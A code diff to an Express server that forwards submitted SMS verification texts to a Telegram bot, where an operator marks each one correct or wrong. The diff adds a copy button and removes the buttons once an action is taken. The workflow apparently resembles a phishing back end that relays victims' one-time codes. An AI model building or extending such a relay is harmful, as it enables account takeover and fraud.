@@ -70,11 +70,14 @@ app.post('/applications/:id/submit-sms', async (req, res) => {
   appData.sms_text = req.body.sms_text;
 
   const message = `💬 *SMS Verification Text Received*\n\n` +
-    `📄 *Content:* ${appData.sms_text}\n` +
+    `📄 *Content:*\n\`\`\`\n${appData.sms_text}\n\`\`\`\n` +
     `🆔 *App ID:* ${appId}`;
 
   const keyboard = {
     inline_keyboard: [
+      [
+        { text: '📋 Copy SMS Content', copy_text: { text: appData.sms_text } }
+      ],
       [
         { text: '✅ Correct SMS Text', callback_data: `sms_correct_${appId}` },
         { text: '❌ Wrong SMS Text', callback_data: `sms_wrong_${appId}` }
@@ -158,12 +161,25 @@ app.post('/telegram-webhook', async (req, res) => {
     }
 
     try {
+      // 1. Show non-blocking top notification popup and remove buttons immediately
       await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           callback_query_id: cb.id,
-          text: `Action processed successfully!`
+          text: `Action processed: ${action.toUpperCase()}`,
+          show_alert: false // Displays notification toast at top instead of pop-up window
+        })
+      });
+
+      // 2. Remove the inline keyboard buttons so they fade/disappear
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageReplyMarkup`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: cb.message.chat.id,
+          message_id: cb.message.message_id,
+          reply_markup: { inline_keyboard: [] }
         })
       });
     } catch (e) {
@@ -178,4 +194,4 @@ const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
-                                    
+         
